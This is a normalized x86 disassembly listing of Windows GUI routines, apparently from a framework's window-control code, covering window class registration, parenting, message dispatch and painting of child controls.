mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_440a84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43dabc
test al al
je r-xdata
mov eax ebx
call sub_43daec
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403320
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403320
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403320
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_440aec
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_440c0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b40
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_440a84
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_443c60
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403074
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40415c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4086e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c11
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_440c18
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_440dd9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43a224
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43a224
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cc64
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cc64
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408898
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_443f70
push 0x1
mov eax [ esi + 0x68 ]
call sub_41de94
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43e62c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_443c60
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440de0
lea eax [ ebp - 0xc0 ]
call sub_403ef8
retn
mov eax esi
mov si 0xffee
call sub_403320
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_440de8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406984
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_440e28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_418980
mov eax esi
call sub_4188d0
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_4188d0
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_418988
pop esi
pop ebx
retn
sub_440e60
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41a1cc
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41a158
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41a158
mov eax esi
call sub_41a1d4
add esp 0x10
pop esi
pop ebx
retn
sub_440ec8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_440eb4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414108
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414108
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_440fa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43e964
mov eax [ ebp - 0x8 ]
push eax
push sub_440e28
mov eax [ ebp - 0x8 ]
push eax
push sub_440e60
push ebp
call sub_440ec8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440ffb
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_43d3f8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_40884c
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408860
mov ecx eax
mov edx edi
mov eax ebx
call sub_43d408
mov eax r-xdata
call sub_40886c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43beac
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_441054
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4410a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4410a8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cc64
sub_4410b8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_414164
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_414108
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_441100
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4410b8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_440954
call sub_43cad8
inc edi
dec esi
jne r-xdata
sub_44119c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4411b8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_414108
call sub_4411b8
inc edi
dec esi
jne r-xdata
sub_441218
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403320
mov ebx eax
mov eax edi
call sub_4411b8
mov eax edi
call sub_441354
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_441258
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44132e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43e62c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414108
call sub_441258
inc esi
dec ebx
jne r-xdata
sub_441354
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441258
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_441394
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4411b8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_441354
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406974
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e62c
jmp r-xdata
sub_44141c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441474
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_441463
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44146a
call sub_43beac
call sub_422150
retn
sub_441494
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412cac
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_40695c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43e62c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44154c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_414108
call sub_441494
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_414108
call sub_441494
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4415e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_443c60
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406948
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44154c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40695c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43e62c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_441674
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43dbe8
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43e6f8
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4415e0
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406948
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43cfc8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44154c
test eax eax
je r-xdata
mov eax ebx
call sub_454618
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43e6f8
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_443c60
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_443c60
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43e62c
sub_4417d8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43e88c
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43e62c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41e644
call sub_41d9c0
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41e680
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43d024
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_4418e0
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43a310
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43e62c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_441914
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_441a34
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441a3b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414108
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_441a6c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_414164
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_414108
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412cd4
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_414108
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41d9c0
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412cd4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41d9c0
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
